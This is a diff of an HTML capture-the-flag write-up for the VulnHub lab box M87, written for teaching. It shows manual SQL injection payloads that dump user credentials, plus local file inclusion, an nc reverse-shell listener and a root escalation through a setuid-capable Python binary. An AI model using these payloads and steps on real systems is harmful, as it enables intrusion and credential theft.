@@ -1,8 +1,23 @@
-I"zO<p>M87 was an easy box. It start with finding directories. Then we fuzz the hidden parameters. <code class="language-plaintext highlighter-rouge">id</code> parameter was vulnerable to <code class="language-plaintext highlighter-rouge">sqli</code> and <code class="language-plaintext highlighter-rouge">file</code> vulnerable to <code class="language-plaintext highlighter-rouge">LFI</code>. With this two vulnerabilities we find out usernames and passwords. Using port 9090 we get the shell on box. Privesc to root by using <code class="language-plaintext highlighter-rouge">capabilities</code>. In this blog I tried to explain how to dump data manually.</p>
+I"]Q<p>M87 was an easy box. It start with finding directories. Then we fuzz the hidden parameters. <code class="language-plaintext highlighter-rouge">id</code> parameter was vulnerable to <code class="language-plaintext highlighter-rouge">sqli</code> and <code class="language-plaintext highlighter-rouge">file</code> vulnerable to <code class="language-plaintext highlighter-rouge">LFI</code>. With this two vulnerabilities we find out usernames and passwords. Using port 9090 we get the shell on box. Privesc to root by using <code class="language-plaintext highlighter-rouge">capabilities</code>. In this blog I tried to explain how to dump data manually.</p>
+
+<h1 id="summary">Summary</h1>
+<ul>
+  <li>Portscan</li>
+  <li>Running gobuster</li>
+  <li>Fuzzing parameters</li>
+  <li>Dump database</li>
+  <li>Local File Inclusion</li>
+  <li>Loggin to Port 9090</li>
+  <li>Getting Reverse shell</li>
+  <li>User Flag</li>
+  <li>Privsec to Root</li>
+  <li>Final Flag</li>
+</ul>
+
 <h1 id="recon">Recon</h1>
 
 <h2 id="portscan">Portscan</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -46,7 +61,7 @@
 42
 43
 44
-</pre></td><td class="rouge-code"><pre>Nmap scan report for 192.168.0.2
+</pre></td> --><td class="rouge-code"><pre>Nmap scan report for 192.168.0.2
 Host is up (0.00027s latency).
 Not shown: 997 closed ports
 PORT     STATE    SERVICE         VERSION
@@ -99,7 +114,7 @@ PORT     STATE    SERVICE         VERSION
 
 <h2 id="gobuster">Gobuster</h2>
 <p>I spend some time on login page to find out vulnerabilities, but no luck. So I used gobuster to find out directories.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -117,7 +132,7 @@ PORT     STATE    SERVICE         VERSION
 16
 17
 18
-</pre></td><td class="rouge-code"><pre>$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/ -o main-go.out
+</pre></td> --><td class="rouge-code"><pre>$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/ -o main-go.out
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -141,7 +156,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 <img src="/assets/img/m87/admin-dir.png" alt="admin-dir" /></p>
 
 <p>Again I run gobuster on <code class="language-plaintext highlighter-rouge">/admin</code> dir and found one <code class="language-plaintext highlighter-rouge">/backup</code> dir.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -159,7 +174,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 16
 17
 18
-</pre></td><td class="rouge-code"><pre>$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/admin/ -o admin-go.out
+</pre></td> --><td class="rouge-code"><pre>$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/admin/ -o admin-go.out
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -192,7 +207,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 
 <h2 id="finding-parameters">Finding parameters</h2>
 <p>Now I tried to fuzz more parameter on each page using <code class="language-plaintext highlighter-rouge">wfuzz</code>. Here I used <code class="language-plaintext highlighter-rouge">SecLists/Discovery/Web-Content/burp-parameter-names.txt</code> wordlist to fuzz.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -213,7 +228,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 19
 20
 21
-</pre></td><td class="rouge-code"><pre>$wfuzz --hw 161 -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.1.223/admin/backup/?FUZZ=
+</pre></td> --><td class="rouge-code"><pre>$wfuzz --hw 161 -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.1.223/admin/backup/?FUZZ=
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
@@ -248,20 +263,20 @@ You can use sqlmap to dump the data, but here I dumped all data manually.</p>
 <p><strong>i) Finding total number of COLUMNS used in sql query.</strong></p>
 
 <p>To find out total number of columns in sql query I used <code class="language-plaintext highlighter-rouge">order by</code>.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 1
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m1.png" alt="m1" /></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 2
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 2
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m2.png" alt="m2" /></p>
 
 <p><strong>ii) Database Name:</strong></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select database())
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select database())
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m3.png" alt="m3" /></p>
 
@@ -269,29 +284,29 @@ You can use sqlmap to dump the data, but here I dumped all data manually.</p>
 
 <p>To find out the table names we need to query table <code class="language-plaintext highlighter-rouge">tables</code> which is part of <code class="language-plaintext highlighter-rouge">information schema</code> database.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select table_name from information_schema.tables where table_schema='db' limit 0,1)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select table_name from information_schema.tables where table_schema='db' limit 0,1)
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m4.png" alt="m4" /></p>
 
 <p>We found 1 table: <code class="language-plaintext highlighter-rouge">users</code></p>
 
 <p><strong>iv) Extract the columns of table users:</strong></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 0,1)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 0,1)
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m6.png" alt="m6" /></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 1,1)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 1,1)
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m7.png" alt="m7" /></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 2,1)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 2,1)
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m8.png" alt="m8" /></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 3,1)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 3,1)
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m9.png" alt="m9" /></p>
 
@@ -306,8 +321,8 @@ You can use sqlmap to dump the data, but here I dumped all data manually.</p>
 <p><strong>v) Dumping all data</strong></p>
 
 <p>The following payload extract first entry from table. In order to dump all the data we need to increase limit squentially.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select concat(id," ",email," ",username," ",password) from users limit 0,1)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select concat(id," ",email," ",username," ",password) from users limit 0,1)
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p><img src="/assets/img/m87/m10.png" alt="m10" /></p>
 
@@ -413,7 +428,7 @@ The final table is:</p>
 <p>Now we can get reverse shell using the terminal window.</p>
 
 <p><img src="/assets/img/m87/rce.png" alt="rce" /></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -427,7 +442,7 @@ The final table is:</p>
 12
 13
 14
-</pre></td><td class="rouge-code"><pre>┌─[hitesh@parrot]─[~/boxes/vulnhub/m87]
+</pre></td> --><td class="rouge-code"><pre>┌─[hitesh@parrot]─[~/boxes/vulnhub/m87]
 └──╼ $nc -nvlp 4444
 listening on [any] 4444 ...
 connect to [192.168.1.222] from (UNKNOWN) [192.168.1.223] 32832
@@ -444,49 +459,49 @@ charlotte@M87:~$
 </pre></td></tr></tbody></table></code></pre></div></div>
 
 <h1 id="flag-1">Flag 1</h1>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre></td><td class="rouge-code"><pre>charlotte@M87:~$ cat local.txt 
+</pre></td> --><td class="rouge-code"><pre>charlotte@M87:~$ cat local.txt 
 29247ebdec52ba0b9a6fd10d68f6b91f
 </pre></td></tr></tbody></table></code></pre></div></div>
 <h1 id="privesc-to-root">Privesc to Root</h1>
 <p>I upload linpeas.sh on box and run it.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
-</pre></td><td class="rouge-code"><pre>[+] Capabilities
+</pre></td> --><td class="rouge-code"><pre>[+] Capabilities
 /usr/bin/old = cap_setuid+ep
 /usr/bin/ping = cap_net_raw+ep
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p>We found that <code class="language-plaintext highlighter-rouge">/usr/bin/old</code> have <code class="language-plaintext highlighter-rouge">cap_setuid</code> capabilities.
 When I run the /usr/bin/old found that it running python.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
-</pre></td><td class="rouge-code"><pre>charlotte@M87:~$ /usr/bin/old
+</pre></td> --><td class="rouge-code"><pre>charlotte@M87:~$ /usr/bin/old
 Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
 [GCC 8.3.0] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
 &gt;&gt;&gt; 
 </pre></td></tr></tbody></table></code></pre></div></div>
 <p>Now it’s very easy to launch the shell using python as root user.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
-</pre></td><td class="rouge-code"><pre>&gt;&gt;&gt; import os
+</pre></td> --><td class="rouge-code"><pre>&gt;&gt;&gt; import os
 &gt;&gt;&gt; os.setuid(0)
 &gt;&gt;&gt; os.system('/bin/bash')
 root@M87:~# 
 
 </pre></td></tr></tbody></table></code></pre></div></div>
 <h1 id="root-flag">Root Flag</h1>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -514,7 +529,7 @@ root@M87:~#
 26
 27
 28
-</pre></td><td class="rouge-code"><pre>root@M87:/root# cat proof.txt 
+</pre></td> --><td class="rouge-code"><pre>root@M87:/root# cat proof.txt 
 
 
 MMMMMMMM               MMMMMMMM     888888888     77777777777777777777
